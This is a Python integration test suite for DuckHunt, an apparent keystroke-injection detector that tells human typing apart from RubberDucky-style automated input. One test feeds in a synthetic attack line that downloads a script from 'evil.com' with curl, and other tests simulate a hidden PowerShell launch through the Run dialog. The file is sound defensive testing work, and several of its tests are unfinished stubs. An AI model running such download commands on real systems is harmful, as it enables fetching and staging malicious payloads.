"""
Integration tests for DuckHunt v2.0

Tests the complete detection pipeline with synthetic attack payloads.
"""

import unittest
import sys
import os
import json
import tempfile
from typing import List

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.analyzer import BehavioralAnalyzer, KeystrokeEvent
from core.detector import PatternDetector
from core.profile_manager import ProfileManager
from core.privacy import PrivacyManager
from enforcement.policy_engine import PolicyEngine, EnforcementPolicy


class TestIntegrationPipeline(unittest.TestCase):
    """Test complete detection pipeline"""

    def setUp(self):
        """Set up test pipeline"""
        # Create temporary profile
        self.test_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json')
        self.test_file.close()
        self.profile_path = self.test_file.name

        # Initialize components
        self.profile_manager = ProfileManager(self.profile_path)
        self._initialize_trained_profile()

        self.analyzer = BehavioralAnalyzer(self.profile_manager, confidence_threshold=0.85)
        self.detector = PatternDetector()
        self.privacy = PrivacyManager(anonymize_logs=True)
        self.policy_engine = PolicyEngine(policy=EnforcementPolicy.ADAPTIVE)

    def tearDown(self):
        """Clean up test artifacts"""
        if os.path.exists(self.profile_path):
            os.remove(self.profile_path)

    def _initialize_trained_profile(self):
        """Initialize profile with trained human behavior model"""
        self.profile_manager.profile = {
            'version': '2.0',
            'learning_phase': 'continuous',
            'sample_count': 10000,
            'speed_distribution': {
                'mean_ms': 145.0,
                'std_dev_ms': 25.0,
                'median_ms': 140.0,
                'q1': 125.0,
                'q3': 160.0,
                'min_ms': 50.0,
                'max_ms': 500.0
            },
            'digraph_timings': {
                'th': {'mean_ms': 145.0, 'std_dev_ms': 23.0, 'samples': 100},
                'he': {'mean_ms': 132.0, 'std_dev_ms': 19.0, 'samples': 100},
                'er': {'mean_ms': 128.0, 'std_dev_ms': 21.0, 'samples': 100},
                'cm': {'mean_ms': 140.0, 'std_dev_ms': 20.0, 'samples': 100},
                'po': {'mean_ms': 135.0, 'std_dev_ms': 22.0, 'samples': 100}
            },
            'typing_patterns': {
                'average_speed_wpm': 65.0,
                'error_rate': 0.034,
                'correction_pattern': {
                    'immediate_backspace_pct': 0.7,
                    'delayed_correction_pct': 0.3
                }
            },
            'temporal_patterns': {
                'active_hours': [9, 10, 11, 14, 15, 16, 17],
                'typing_rhythm_variance': 0.15
            },
            'mouse_characteristics': {
                'enabled': False
            },
            'metadata': {
                'platform': 'windows',
                'keyboard_layout': 'en-US',
                'adaptive_learning_rate': 0.05
            }
        }

    def test_end_to_end_normal_typing(self):
        """Test that normal typing flows through pipeline without blocking"""
        # Simulate normal typing
        events = self._simulate_normal_typing("the quick brown fox")

        blocked_count = 0
        for event in events:
            # Analyze
            analysis_result = self.analyzer.analyze_keystroke(event)

            # Check patterns
            pattern_matches = self.detector.check_pattern_match(events[-10:])

            # Enforce policy
            decision = self.policy_engine.make_decision(
                confidence=analysis_result.confidence,
                attack_type='unknown',
                pattern_matches=pattern_matches
            )

            if decision['action'] in ['block', 'block_temporary']:
                blocked_count += 1

        # Normal typing should not be blocked
        block_rate = blocked_count / len(events)
        self.assertLess(block_rate, 0.05,
                       f"Normal typing block rate too high: {block_rate:.2%}")

    def test_end_to_end_fast_injection_detected(self):
        """Test that fast injection attack is detected and blocked"""
        # Simulate RubberDucky fast injection
        events = self._simulate_fast_injection("curl -o /tmp/payload http://evil.com/bad.sh")

        high_confidence_count = 0
        for event in events:
            analysis_result = self.analyzer.analyze_keystroke(event)

            if analysis_result.confidence >= 0.85:
                high_confidence_count += 1

        # Should detect majority of attack
        detection_rate = high_confidence_count / len(events)
        self.assertGreater(detection_rate, 0.70,
                         f"Fast injection detection rate too low: {detection_rate:.2%}")

    def test_end_to_end_powershell_attack_detected(self):
        """Test that PowerShell attack is detected"""
        # Simulate PowerShell download-execute attack
        attack_sequence = [
            ('LWin', 10),
            ('r', 15),
        ]
        attack_sequence += [(c, 15) for c in "powershell -WindowStyle Hidden"]

        events = []
        for key, interval in attack_sequence:
            events.append(self._create_event(key, len(events), interval, window='Run'))

        # Analyze complete sequence
        final_event = events[-1]
        analysis_result = self.analyzer.analyze_keystroke(final_event)
        pattern_matches = self.detector.check_pattern_match(events)

        # Should detect high-risk pattern
        self.assertGreater(len(pattern_matches), 0,
                         "PowerShell pattern not detected")

        # Should have high confidence
        max_pattern_risk = max(m['risk'] for m in pattern_matches) if pattern_matches else 0
        combined_confidence = max(analysis_result.confidence, max_pattern_risk)

        self.assertGreater(combined_confidence, 0.80,
                         f"PowerShell attack confidence too low: {combined_confidence}")

    def test_end_to_end_evasive_attack_detected(self):
        """Test that evasive attack with delays is still detected"""
        # Simulate attack with human-like delays but no errors
        events = self._simulate_evasive_attack("cmd")

        # Check for zero error rate
        backspace_count = sum(1 for e in events if e.key == 'BackSpace')
        error_rate = backspace_count / len(events)

        # Zero error rate should be suspicious
        self.assertEqual(error_rate, 0.0)

        # Pattern matching should still detect "cmd" in Run dialog
        pattern_matches = self.detector.check_pattern_match(events[-5:])

        # Should have some detection
        # (May not be as high confidence as fast injection)

    def test_privacy_pipeline_integration(self):
        """Test that privacy layer integrates with pipeline"""
        # Simulate attack
        events = self._simulate_fast_injection("malicious command")

        for event in events:
            # Analyze
            analysis_result = self.analyzer.analyze_keystroke(event)

            if analysis_result.is_attack:
                # Create attack log
                attack_log = {
                    'timestamp': event.timestamp,
                    'attack_type': analysis_result.attack_type,
                    'confidence': analysis_result.confidence,
                    'keystroke_sequence': ''.join([e.key for e in events[-10:]]),
                    'action_taken': 'blocked'
                }

                # Sanitize with privacy manager
                sanitized_log = self.privacy.sanitize_attack_log(attack_log)

                # Verify privacy preserved
                self.assertNotIn('keystroke_sequence', sanitized_log)
                self.assertIn('content_hash', sanitized_log)

    def test_policy_enforcement_integration(self):
        """Test that policy engine integrates with detection"""
        # Test different confidence levels

        test_cases = [
            (0.95, 'block'),  # High confidence should block
            (0.75, ['log', 'alert']),  # Medium confidence should log/alert
            (0.50, 'log'),  # Low confidence should log only
        ]

        for confidence, expected_actions in test_cases:
            decision = self.policy_engine.make_decision(
                confidence=confidence,
                attack_type='speed_anomaly',
                pattern_matches=[]
            )

            if isinstance(expected_actions, list):
                self.assertIn(decision['action'], expected_actions,
                            f"Wrong action for confidence {confidence}")
            else:
                self.assertEqual(decision['action'], expected_actions,
                               f"Wrong action for confidence {confidence}")

    def test_continuous_learning_integration(self):
        """Test that continuous learning updates profile during normal use"""
        initial_mean = self.profile_manager.profile['speed_distribution']['mean_ms']

        # Simulate normal typing over time
        events = self._simulate_normal_typing("the quick brown fox jumps over the lazy dog")

        for event in events:
            self.analyzer.analyze_keystroke(event)

        # Profile should update slightly
        # (Exact change depends on learning rate)

    # Helper methods for creating test events

    def _create_event(self, key: str, timestamp: int, inter_event_ms: float,
                     injected: bool = False, window: str = "Editor") -> KeystrokeEvent:
        """Create a KeystrokeEvent for testing"""
        return KeystrokeEvent(
            timestamp=f"2025-01-06T12:00:{timestamp:02d}Z",
            key=key,
            event_type='key_down',
            inter_event_ms=inter_event_ms,
            window_name=window,
            application="TestApp",
            injected=injected,
            scan_code=0,
            is_repeat=False
        )

    def _simulate_normal_typing(self, text: str) -> List[KeystrokeEvent]:
        """Simulate normal human typing"""
        import random
        events = []

        for i, char in enumerate(text):
            # Human typing: 100-200ms with variation
            interval = random.gauss(145, 25)
            interval = max(80, min(250, interval))

            # Occasional errors (backspace)
            if random.random() < 0.03:  # 3% error rate
                events.append(self._create_event('BackSpace', i, interval))
                interval = random.gauss(145, 25)

            events.append(self._create_event(char, i, interval))

        return events

    def _simulate_fast_injection(self, text: str) -> List[KeystrokeEvent]:
        """Simulate fast automated injection"""
        events = []

        for i, char in enumerate(text):
            # Fast consistent injection: 15ms
            interval = 15.0
            events.append(self._create_event(char, i, interval, injected=False))

        return events

    def _simulate_evasive_attack(self, text: str) -> List[KeystrokeEvent]:
        """Simulate evasive attack with delays but no errors"""
        import random
        events = []

        # WIN+R
        events.append(self._create_event('LWin', 0, 100, window='Desktop'))
        events.append(self._create_event('r', 1, 150, window='Desktop'))

        # Type with semi-human delays but zero errors
        for i, char in enumerate(text):
            # Random delay in human range
            interval = random.choice([120, 130, 140, 150, 135, 145])
            events.append(self._create_event(char, i+2, interval, window='Run'))

        return events


class TestSyntheticPayloads(unittest.TestCase):
    """Test detection against synthetic attack payloads"""

    def setUp(self):
        """Set up test environment"""
        self.test_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json')
        self.test_file.close()
        self.profile_path = self.test_file.name

        self.profile_manager = ProfileManager(self.profile_path)
        self._initialize_trained_profile()

        self.analyzer = BehavioralAnalyzer(self.profile_manager)
        self.detector = PatternDetector()

    def tearDown(self):
        """Clean up"""
        if os.path.exists(self.profile_path):
            os.remove(self.profile_path)

    def _initialize_trained_profile(self):
        """Initialize with typical human profile"""
        self.profile_manager.profile = {
            'version': '2.0',
            'sample_count': 10000,
            'speed_distribution': {
                'mean_ms': 145.0,
                'std_dev_ms': 25.0,
                'q1': 125.0,
                'q3': 160.0
            },
            'typing_patterns': {
                'error_rate': 0.034
            },
            'digraph_timings': {}
        }

    def test_rubberducky_simple_payload(self):
        """Test detection of simple RubberDucky payload"""
        # Payload: WIN+R, cmd, echo, exit
        # Expected confidence: >0.90

        events = self._parse_rubberducky_payload(
            "tests/synthetic_attacks/rubberducky_simple.txt"
        )

        if events:
            detections = 0
            for event in events:
                result = self.analyzer.analyze_keystroke(event)
                if result.confidence >= 0.85:
                    detections += 1

            detection_rate = detections / len(events)
            # Should detect significant portion
            # (Exact rate depends on implementation)

    def test_powershell_payload(self):
        """Test detection of PowerShell download-execute payload"""
        # Expected confidence: >0.95 (multiple high-risk signals)

        # Manually create event sequence (payload parsing optional)
        events = []
        # Implementation would parse rubberducky_powershell.txt

        # Verify pattern detection
        pattern_matches = self.detector.check_pattern_match(events) if events else []

        # Should detect PowerShell patterns

    def test_bash_bunny_linux_payload(self):
        """Test detection of Bash Bunny Linux payload"""
        # Expected confidence: >0.90

        # Implementation would parse bash_bunny_linux.txt
        pass

    def test_evasive_delayed_payload(self):
        """Test detection of evasive attack with delays"""
        # Expected confidence: 0.70-0.85 (lower than fast, still detectable)

        # Implementation would parse evasive_delayed.txt
        pass

    def _parse_rubberducky_payload(self, filepath: str) -> List[KeystrokeEvent]:
        """Parse RubberDucky script into KeystrokeEvent sequence"""
        # Simple parser for test payloads
        # Real implementation would fully parse DuckyScript syntax

        if not os.path.exists(filepath):
            return []

        events = []
        with open(filepath, 'r') as f:
            lines = f.readlines()

        # Basic parsing (simplified)
        timestamp = 0
        for line in lines:
            line = line.strip()
            if line.startswith('STRING'):
                text = line.replace('STRING ', '')
                for char in text:
                    events.append(self._create_event(char, timestamp, 15.0))
                    timestamp += 15

        return events

    def _create_event(self, key: str, timestamp: int, inter_event_ms: float) -> KeystrokeEvent:
        """Create test event"""
        return KeystrokeEvent(
            timestamp=f"2025-01-06T12:00:{timestamp:02d}Z",
            key=key,
            event_type='key_down',
            inter_event_ms=inter_event_ms,
            window_name="Terminal",
            application="Test",
            injected=False,
            scan_code=0,
            is_repeat=False
        )


def run_tests():
    """Run all integration tests"""
    unittest.main(argv=[''], verbosity=2, exit=False)


if __name__ == '__main__':
    print("DuckHunt v2.0 - Integration Tests")
    print("=" * 60)
    run_tests()
